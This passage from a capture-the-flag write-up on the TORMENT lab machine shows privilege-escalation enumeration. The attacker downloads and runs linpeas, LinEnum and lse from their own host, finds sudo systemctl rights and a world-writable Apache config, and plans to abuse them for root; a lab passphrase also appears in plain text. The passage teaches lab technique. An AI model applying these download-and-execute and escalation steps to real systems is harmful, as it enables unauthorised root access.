/lib/systemd/system/mountall-bootclean.service
/lib/systemd/system/stop-bootlogd.service
/lib/systemd/system/halt.service
/lib/systemd/system/nfs-common.service
/lib/systemd/system/hostname.service
/lib/systemd/system/mountnfs.service
/lib/systemd/system/single.service
/lib/systemd/system/saned.service
/lib/systemd/system/alsa-utils.service
/lib/systemd/system/hwclock.service
/lib/systemd/system/checkroot-bootclean.service
/lib/systemd/system/mountall.service
/lib/systemd/system/bootmisc.service
/lib/systemd/system/motd.service
/lib/systemd/system/mountdevsubfs.service
/lib/systemd/system/killprocs.service
/lib/systemd/system/rc.service
/lib/systemd/system/fuse.service
/lib/systemd/system/rcS.service
/lib/systemd/system/umountnfs.service
/lib/systemd/system/samba.service
/lib/systemd/system/checkfs.service
/lib/systemd/system/bootlogs.service
/lib/systemd/system/reboot.service
/lib/systemd/system/checkroot.service
/lib/systemd/system/x11-common.service
/lib/systemd/system/cryptdisks.service
/lib/systemd/system/mountnfs-bootclean.service
/lib/systemd/system/sendsigs.service
/lib/systemd/system/umountfs.service
/home/patrick
/home/patrick/.bash_history
/home/patrick/.bashrc
/home/patrick/.nano
/home/patrick/.profile
/home/patrick/.bash_logout
/home/patrick/.ssh
/home/patrick/.ssh/id_rsa
/home/patrick/.ssh/authorized_keys
/home/patrick/.ssh/id_rsa.pub
/tmp
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.ICE-unix/712
/tmp/.X11-unix
/tmp/.font-unix
/tmp/.XIM-unix
/dev/net/tun
/dev/fuse
/dev/mqueue
/dev/log
/dev/shm
/dev/char/5:0
/dev/char/5:2
/dev/char/1:5
/dev/char/1:9
/dev/char/1:8
/dev/char/1:3
/dev/char/1:7
/dev/stderr
/dev/stdout
/dev/stdin
/dev/fd
/dev/pts/0
/dev/ptmx
/dev/tty
/dev/urandom
/dev/random
/dev/full
/dev/zero
/dev/null
/etc/systemd/system/samba-ad-dc.service
/etc/apache2/apache2.conf
/var/www/html
/var/www/html/index.html
/var/lib/php/sessions
/var/tmp
/var/spool/samba
/var/spool/postfix/dev/log
/var/spool/postfix/dev/random
/var/spool/postfix/dev/urandom
/var/lock</code></pre>
<h3 id="finding-files-writable-by-root">Finding files writable by root</h3>
<pre class="shell"><code>patrick@TORMENT:~$ find / -type f -writable -user root -not -user patrick -not -path &quot;/proc*&quot; -not -path &quot;/sys*&quot;  2&gt;/dev/null
/etc/apache2/apache2.conf</code></pre>
<h3 id="ps--ef">ps -ef</h3>
<pre class="shell"><code>patrick@TORMENT:~$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 Dec22 ?        00:00:02 /sbin/init
root         2     0  0 Dec22 ?        00:00:00 [kthreadd]
root         3     2  0 Dec22 ?        00:00:08 [ksoftirqd/0]
root         5     2  0 Dec22 ?        00:00:00 [kworker/0:0H]
root         7     2  0 Dec22 ?        00:00:02 [rcu_sched]
root         8     2  0 Dec22 ?        00:00:00 [rcu_bh]
root         9     2  0 Dec22 ?        00:00:00 [migration/0]
root        10     2  0 Dec22 ?        00:00:00 [lru-add-drain]
root        11     2  0 Dec22 ?        00:00:00 [watchdog/0]
root        12     2  0 Dec22 ?        00:00:00 [cpuhp/0]
root        13     2  0 Dec22 ?        00:00:00 [kdevtmpfs]
root        14     2  0 Dec22 ?        00:00:00 [netns]
root        15     2  0 Dec22 ?        00:00:00 [khungtaskd]
root        16     2  0 Dec22 ?        00:00:00 [oom_reaper]
root        17     2  0 Dec22 ?        00:00:00 [writeback]
root        18     2  0 Dec22 ?        00:00:00 [kcompactd0]
root        19     2  0 Dec22 ?        00:00:00 [ksmd]
root        21     2  0 Dec22 ?        00:00:00 [khugepaged]
root        22     2  0 Dec22 ?        00:00:00 [crypto]
root        23     2  0 Dec22 ?        00:00:00 [kintegrityd]
root        24     2  0 Dec22 ?        00:00:00 [bioset]
root        25     2  0 Dec22 ?        00:00:00 [kblockd]
root        26     2  0 Dec22 ?        00:00:00 [devfreq_wq]
root        27     2  0 Dec22 ?        00:00:00 [watchdogd]
root        28     2  0 Dec22 ?        00:00:00 [kswapd0]
root        29     2  0 Dec22 ?        00:00:00 [vmstat]
root        41     2  0 Dec22 ?        00:00:00 [kthrotld]
root        42     2  0 Dec22 ?        00:00:00 [ipv6_addrconf]
root        75     2  0 Dec22 ?        00:00:00 [ata_sff]
root       103     2  0 Dec22 ?        00:00:00 [scsi_eh_0]
root       104     2  0 Dec22 ?        00:00:00 [scsi_tmf_0]
root       105     2  0 Dec22 ?        00:00:00 [scsi_eh_1]
root       106     2  0 Dec22 ?        00:00:00 [scsi_tmf_1]
root       108     2  0 Dec22 ?        00:00:00 [mpt_poll_0]
root       109     2  0 Dec22 ?        00:00:00 [mpt/0]
root       110     2  0 Dec22 ?        00:00:00 [scsi_eh_2]
root       111     2  0 Dec22 ?        00:00:00 [scsi_tmf_2]
root       112     2  0 Dec22 ?        00:00:00 [bioset]
root       143     2  0 Dec22 ?        00:00:00 [kworker/0:1H]
root       179     2  0 Dec22 ?        00:00:00 [kworker/u3:0]
root       186     2  0 Dec22 ?        00:00:00 [jbd2/sda1-8]
root       187     2  0 Dec22 ?        00:00:00 [ext4-rsv-conver]
root       218     1  0 Dec22 ?        00:00:02 /lib/systemd/systemd-journald
root       235     2  0 Dec22 ?        00:00:00 [kauditd]
root       246     2  0 Dec22 ?        00:00:00 [rpciod]
root       250     2  0 Dec22 ?        00:00:00 [xprtiod]
root       264     1  0 Dec22 ?        00:00:00 /usr/sbin/blkmapd
root       268     1  0 Dec22 ?        00:00:00 /lib/systemd/systemd-udevd
root       296     1  0 Dec22 ?        00:00:00 /usr/sbin/rpc.idmapd
systemd+   297     1  0 Dec22 ?        00:00:09 /lib/systemd/systemd-timesyncd
root       299     1  0 Dec22 ?        00:00:00 /sbin/rpcbind -f -w
root       329     2  0 Dec22 ?        00:00:00 [ttm_swap]
root       360     1  0 Dec22 ?        00:00:00 /usr/sbin/ModemManager
message+   362     1  0 Dec22 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfi
root       389     1  0 Dec22 ?        00:00:01 /usr/sbin/NetworkManager --no-daemon
rtkit      392     1  0 Dec22 ?        00:00:00 /usr/lib/rtkit/rtkit-daemon
root       393     1  0 Dec22 ?        00:00:00 /usr/sbin/rsyslogd -n
root       394     1  0 Dec22 ?        00:00:00 /lib/systemd/systemd-logind
root       395     1  0 Dec22 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
root       399     1  0 Dec22 ?        00:00:00 /usr/sbin/cron -f
avahi      400     1  0 Dec22 ?        00:00:01 avahi-daemon: running [TORMENT.local]
avahi      417   400  0 Dec22 ?        00:00:00 avahi-daemon: chroot helper
root       427     1  0 Dec22 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
colord     474     1  0 Dec22 ?        00:00:00 /usr/lib/colord/colord
root       497     1  0 Dec22 ?        00:00:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       508     1  0 Dec22 ?        00:00:00 /usr/sbin/sshd -D
root       511     1  0 Dec22 ?        00:00:00 /usr/sbin/rpc.mountd --manage-gids
irc        515     1  0 Dec22 ?        00:00:01 /usr/sbin/ngircd
root       517     1  0 Dec22 ?        00:00:00 /usr/sbin/dovecot
dovecot    524   517  0 Dec22 ?        00:00:00 dovecot/anvil
root       525   517  0 Dec22 ?        00:00:00 dovecot/log
root       536     2  0 Dec22 ?        00:00:00 [nfsd4_callbacks]
root       537     2  0 Dec22 ?        00:00:00 [lockd]
root       540     2  0 Dec22 ?        00:00:00 [nfsd]
root       542     2  0 Dec22 ?        00:00:00 [nfsd]
root       543     2  0 Dec22 ?        00:00:00 [nfsd]
root       545     2  0 Dec22 ?        00:00:00 [nfsd]
root       546     2  0 Dec22 ?        00:00:00 [nfsd]
root       548     2  0 Dec22 ?        00:00:00 [nfsd]
root       550     2  0 Dec22 ?        00:00:00 [nfsd]
root       553     2  0 Dec22 ?        00:00:00 [nfsd]
root       600     1  0 Dec22 ?        00:00:00 /usr/sbin/gdm3
root       623   600  0 Dec22 ?        00:00:00 gdm-session-worker [pam/gdm-launch-environment]
Debian-+   656     1  0 Dec22 ?        00:00:00 /lib/systemd/systemd --user
Debian-+   661   656  0 Dec22 ?        00:00:00 (sd-pam)
root       680     1  0 Dec22 ?        00:00:01 /usr/sbin/apache2 -k start
Debian-+   686   623  0 Dec22 tty1     00:00:00 /usr/lib/gdm3/gdm-wayland-session gnome-session --autostart /usr/sh
Debian-+   691   656  0 Dec22 ?        00:00:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidf
Debian-+   712   686  0 Dec22 tty1     00:00:00 /usr/lib/gnome-session/gnome-session-binary --autostart /usr/share/
mysql      724     1  0 Dec22 ?        00:00:14 /usr/sbin/mysqld
Debian-+   748   712  0 Dec22 tty1     00:00:13 /usr/bin/gnome-shell
root       762     1  0 Dec22 ?        00:00:00 /usr/lib/upower/upowerd
Debian-+   799   748  0 Dec22 tty1     00:00:00 /usr/bin/Xwayland :1024 -rootless -noreset -listen 4 -listen 5 -dis
Debian-+   802   656  0 Dec22 ?        00:00:00 /usr/lib/at-spi2-core/at-spi-bus-launcher
Debian-+   807   802  0 Dec22 ?        00:00:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/acce
Debian-+   809   656  0 Dec22 ?        00:00:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
Debian-+   812   656  0 Dec22 ?        00:00:00 /usr/bin/pulseaudio --daemonize=no
root       817   389  0 Dec22 ?        00:00:00 /sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf
root       882     1  0 Dec22 ?        00:00:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       883     1  0 Dec22 ?        00:00:00 /usr/lib/packagekit/packagekitd
Debian-+   886   712  0 Dec22 tty1     00:00:00 /usr/lib/gnome-settings-daemon/gnome-settings-daemon
root       924     1  0 Dec22 ?        00:00:00 /usr/sbin/minissdpd -i 0.0.0.0
root       967     1  0 Dec22 ?        00:00:00 /usr/sbin/nmbd
root      1005     1  0 Dec22 ?        00:00:00 /usr/sbin/smbd
root      1007  1005  0 Dec22 ?        00:00:00 /usr/sbin/smbd
root      1008  1005  0 Dec22 ?        00:00:00 /usr/sbin/smbd
root      1020  1005  0 Dec22 ?        00:00:00 /usr/sbin/smbd
root      1136     1  0 Dec22 ?        00:00:00 /usr/lib/postfix/sbin/master -w
postfix   1139  1136  0 Dec22 ?        00:00:00 qmgr -l -t unix -u
postfix   1454  1136  0 Dec22 ?        00:00:00 tlsmgr -l -t unix -u -c
www-data  5547   680  0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  5548   680  0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  5549   680  0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  5550   680  0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  5551   680  0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  5552   680  0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
root      5553     1  0 00:09 ?        00:00:00 /usr/sbin/cupsd -l
root      5554     1  0 00:09 ?        00:00:00 /usr/sbin/cups-browsed
root      5976     2  0 01:09 ?        00:00:00 [kworker/u2:1]
root      6011   508  0 01:10 ?        00:00:00 sshd: patrick [priv]
patrick   6013     1  0 01:10 ?        00:00:00 /lib/systemd/systemd --user
patrick   6014  6013  0 01:10 ?        00:00:00 (sd-pam)
patrick   6022  6011  0 01:10 ?        00:00:00 sshd: patrick@pts/0
patrick   6023  6022  0 01:10 pts/0    00:00:00 -bash
root      6063     2  0 01:18 ?        00:00:00 [kworker/0:0]
root      6091     2  0 01:27 ?        00:00:00 [kworker/0:1]
root      6140     2  0 01:33 ?        00:00:00 [kworker/u2:0]
root      6169     2  0 01:36 ?        00:00:00 [kworker/0:2]
root      6234     2  0 01:39 ?        00:00:00 [kworker/u2:2]
postfix   6237  1136  0 01:39 ?        00:00:00 pickup -l -t unix -u -c
patrick   6252  6023  0 01:41 pts/0    00:00:00 ps -ef</code></pre>
<h3 id="enumeration-scripts">enumeration scripts</h3>
<pre class="shell"><code>f0c1s@kali:~/collected-tools $
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.77 - - [22/Dec/2021 17:42:42] &quot;GET /lse.sh HTTP/1.1&quot; 200 -
192.168.56.77 - - [22/Dec/2021 17:42:42] &quot;GET /LinEnum.sh HTTP/1.1&quot; 200 -
192.168.56.77 - - [22/Dec/2021 17:42:42] &quot;GET /linpeas.sh HTTP/1.1&quot; 200 -</code></pre>
<pre class="shell"><code>patrick@TORMENT:~$ wget -q 192.168.56.70/{lse,LinEnum,linpeas}.sh
patrick@TORMENT:~$ ls -la
total 588
drwx------ 4 patrick patrick   4096 Dec 23 01:42 .
drwxr-xr-x 4 root    root      4096 Dec 27  2018 ..
-rw------- 1 patrick patrick     65 Jan  4  2019 .bash_history
-rwx------ 1 patrick patrick    220 Dec 27  2018 .bash_logout
-rwx------ 1 patrick patrick   3526 Dec 27  2018 .bashrc
-rw-r--r-- 1 patrick patrick  46631 Sep 24 10:52 LinEnum.sh
-rw-r--r-- 1 patrick patrick 473222 Sep 24 11:38 linpeas.sh
-rw-r--r-- 1 patrick patrick  43570 Sep 24 10:51 lse.sh
drwxr-xr-x 2 patrick patrick   4096 Dec 31  2018 .nano
-rwx------ 1 patrick patrick    675 Dec 27  2018 .profile
drwx------ 2 patrick patrick   4096 Jan  4  2019 .ssh
patrick@TORMENT:~$ chmod +x *.sh</code></pre>
<h4 id="lse.sh">lse.sh</h4>
<pre class="shell"><code>patrick@TORMENT:~$ ./lse.sh
---
If you know the current user password, write it here to check sudo privileges: mostmachineshaveasupersecurekeyandalongpassphrase
---

 LSE Version: 3.7

        User: patrick
     User ID: 1001
    Password: ******
        Home: /home/patrick
        Path: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
       umask: 0022

    Hostname: TORMENT
       Linux: 4.9.0-8-amd64
Distribution: Debian GNU/Linux 9.6 (stretch)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip
[i] usr060 Other users..................................................... skip
[*] usr070 PATH variables defined inside /etc.............................. yes!
[!] usr080 Is &#39;.&#39; in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for patrick on TORMENT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on TORMENT:
    (ALL) NOPASSWD: /bin/systemctl poweroff, /bin/systemctl halt, /bin/systemctl reboot
---
[!] sud020 Can we sudo with a password?.................................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user&#39;s home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... yes!
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does &#39;patrick&#39; have mail?....................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. yes!
---
-rwxrwxrwx 1 root root 7224 Nov  4  2018 /etc/apache2/apache2.conf
---
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with &#39;no_root_squash&#39; option?............. nope
[*] fst220 Are there NFS exports with &#39;no_all_squash&#39; option?.............. nope
[i] fst500 Files owned by user &#39;patrick&#39;................................... skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
[!] sys020 Does the /etc/passwd have hashes?............................... nope
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... nope
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. nope
[!] ret060 Can we write to executable paths present in cron jobs........... skip
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Nameservers..................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... nope
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. yes!
---
/run/user/1001/gnupg/S.gpg-agent
/run/user/1001/gnupg/S.gpg-agent.ssh
/run/user/1001/gnupg/S.gpg-agent.extra
/run/user/1001/gnupg/S.gpg-agent.browser
---
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any &#39;pass&#39; store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
[i] sof540 Tmux version.................................................... skip
[i] sof550 Screen version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the &#39;docker&#39; group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip

==================================( FINISHED )==================================
patrick@TORMENT:~$</code></pre>
<p>A few things of note, patrick can run <code>/bin/systemctl poweroff</code>, <code>/bin/systemctl halt</code>, <code>/bin/systemctl reboot</code>, this hints towards restarting a service.</p>
<p>And apache configuration is world writable, <code>-rwxrwxrwx 1 root root 7224 Nov  4  2018 /etc/apache2/apache2.conf</code>, may be restart this.</p>
<p>Questions now become, why do we want to restart it, what do we need to change, and how do we know that we succeeded?</p>
<p>Actually other two things are gnupg and vmware-tools. I think I can safely ignore vmware-tools.</p>
<h4 id="linenum">LinEnum</h4>
<p><a href="2.out-linenum.txt">Checkout 2.out-linenum.txt</a></p>
<figure>
<img src="33.linenum-suggests-sudo-pwnage.png" alt="" /><figcaption>33.linenum-suggests-sudo-pwnage</figcaption>
</figure>
<p>This actually hints towards sudo pwnage via systemctl. I think I can just create a service and get it to load and execute to get root shell.</p>
<h2 id="attempt-at-root-shell-via-systemctl">Attempt at root shell via systemctl</h2>
<p>Unfortunately, “mostmachineshaveasupersecurekeyandalongpassphrase” is a password for SSH and not of user:patrick.</p>
<figure>
<img src="34.cannot-use-ssh-password-for-user-patrick-for-sudo.png" alt="" /><figcaption>34.cannot-use-ssh-password-for-user-patrick-for-sudo</figcaption>
</figure>
<p>Alright, back to apache attack.</p>
<h2 id="attacking-apache2-configuration">Attacking Apache2 configuration</h2>
<p>Lets go through <code>/etc/apache2/apache2.conf</code></p>
<h3 id="etcapache2apache2.conf"><code>/etc/apache2/apache2.conf</code></h3>
<pre class="shell"><code>patrick@TORMENT:~$ cat /etc/apache2/apache2.conf
# This is the main Apache server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See http://httpd.apache.org/docs/2.4/ for detailed information about
# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
# hints.
#
#
# Summary of how the Apache 2 configuration works in Debian:
# The Apache 2 web server configuration in Debian is quite different to
# upstream&#39;s suggested way to configure the web server. This is because Debian&#39;s
# default Apache2 installation attempts to make adding and removing modules,
# virtual hosts, and extra configuration directives as flexible as possible, in
# order to make automating the changes and administering the server as easy as
# possible.

# It is split into several files forming the configuration hierarchy outlined
# below, all located in the /etc/apache2/ directory:
#
#       /etc/apache2/
#       |-- apache2.conf
#       |       `--  ports.conf
#       |-- mods-enabled
#       |       |-- *.load
#       |       `-- *.conf
#       |-- conf-enabled
#       |       `-- *.conf
#       `-- sites-enabled
#               `-- *.conf
#
#
# * apache2.conf is the main configuration file (this file). It puts the pieces
#   together by including all remaining configuration files when starting up the
#   web server.
#
# * ports.conf is always included from the main configuration file. It is
#   supposed to determine listening ports for incoming connections which can be
#   customized anytime.
#
# * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
#   directories contain particular configuration snippets which manage modules,
#   global configuration fragments, or virtual host configurations,
#   respectively.
#
#   They are activated by symlinking available configuration files from their
#   respective *-available/ counterparts. These should be managed by using our
#   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
#   their respective man pages for detailed information.
#
# * The binary is called apache2. Due to the use of environment variables, in
#   the default configuration, apache2 needs to be started/stopped with
#   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
#   work with the default configuration.


# Global configuration
#

#
# ServerRoot: The top of the directory tree under which the server&#39;s
# configuration, error, and log files are kept.
#
# NOTE!  If you intend to place this on an NFS (or otherwise network)
# mounted filesystem then please read the Mutex documentation (available
# at &lt;URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex&gt;);
# you will save yourself a lot of trouble.
#
# Do NOT add a slash at the end of the directory path.
#
#ServerRoot &quot;/etc/apache2&quot;

#
# The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
#
#Mutex file:${APACHE_LOCK_DIR} default

#
# The directory where shm and other runtime files will be stored.
#

DefaultRuntimeDir ${APACHE_RUN_DIR}

#
# PidFile: The file in which the server should record its process
# identification number when it starts.
# This needs to be set in /etc/apache2/envvars
#
PidFile ${APACHE_PID_FILE}

#
# Timeout: The number of seconds before receives and sends time out.
#
Timeout 300

#
# KeepAlive: Whether or not to allow persistent connections (more than
# one request per connection). Set to &quot;Off&quot; to deactivate.
#
KeepAlive On

#
# MaxKeepAliveRequests: The maximum number of requests to allow
# during a persistent connection. Set to 0 to allow an unlimited amount.
# We recommend you leave this number high, for maximum performance.
#
MaxKeepAliveRequests 100

#
# KeepAliveTimeout: Number of seconds to wait for the next request from the
# same client on the same connection.
#
KeepAliveTimeout 5


# These need to be set in /etc/apache2/envvars
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}

#
# HostnameLookups: Log the names of clients or just their IP addresses
# e.g., www.apache.org (on) or 204.62.129.132 (off).
# The default is off because it&#39;d be overall better for the net if people
# had to knowingly turn this feature on, since enabling it means that
# each client request will result in AT LEAST one lookup request to the
# nameserver.
#
HostnameLookups Off

# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a &lt;VirtualHost&gt;
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a &lt;VirtualHost&gt;
# container, that host&#39;s errors will be logged there and not here.
#
ErrorLog ${APACHE_LOG_DIR}/error.log

#
# LogLevel: Control the severity of messages logged to the error_log.
# Available values: trace8, ..., trace1, debug, info, notice, warn,
# error, crit, alert, emerg.
# It is also possible to configure the log level for particular modules, e.g.
# &quot;LogLevel info ssl:warn&quot;
#
LogLevel warn

# Include module configuration:
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf

# Include list of ports to listen on
Include ports.conf


# Sets the default security model of the Apache2 HTTPD server. It does
# not allow access to the root filesystem outside of /usr/share and /var/www.
# The former is used by web applications packaged in Debian,
# the latter may be used for local directories served by the web server. If
# your system is serving content from a sub-directory in /srv you must allow
# access here, or in any related virtual host.
&lt;Directory /&gt;
        Options FollowSymLinks
        AllowOverride None
        Require all denied
&lt;/Directory&gt;

&lt;Directory /usr/share&gt;
        AllowOverride None
        Require all granted
&lt;/Directory&gt;

&lt;Directory /var/www/&gt;
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
&lt;/Directory&gt;

#&lt;Directory /srv/&gt;
#       Options Indexes FollowSymLinks
#       AllowOverride None
#       Require all granted
#&lt;/Directory&gt;




# AccessFileName: The name of the file to look for in each directory
# for additional configuration directives.  See also the AllowOverride
# directive.
#
AccessFileName .htaccess

#
# The following lines prevent .htaccess and .htpasswd files from being
# viewed by Web clients.
#
&lt;FilesMatch &quot;^\.ht&quot;&gt;
        Require all denied
&lt;/FilesMatch&gt;


#
# The following directives define some format nicknames for use with
# a CustomLog directive.
#
# These deviate from the Common Log Format definitions in that they use %O
# (the actual bytes sent including headers) instead of %b (the size of the
# requested file), because the latter makes it impossible to detect partial
# requests.
#
# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
# Use mod_remoteip instead.
#
LogFormat &quot;%v:%p %h %l %u %t \&quot;%r\&quot; %&gt;s %O \&quot;%{Referer}i\&quot; \&quot;%{User-Agent}i\&quot;&quot; vhost_combined
LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %O \&quot;%{Referer}i\&quot; \&quot;%{User-Agent}i\&quot;&quot; combined
LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %O&quot; common
LogFormat &quot;%{Referer}i -&gt; %U&quot; referer
LogFormat &quot;%{User-agent}i&quot; agent

# Include of directories ignores editors&#39; and dpkg&#39;s backup files,
# see README.Debian for details.

# Include generic snippets of statements
IncludeOptional conf-enabled/*.conf

# Include the virtual host configurations:
IncludeOptional sites-enabled/*.conf

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre>
<figure>
<img src="35.notice-User-Group-config.png" alt="" /><figcaption>35.notice-User-Group-config</figcaption>
</figure>
<h3 id="etcapache2envvars"><code>/etc/apache2/envvars</code></h3>
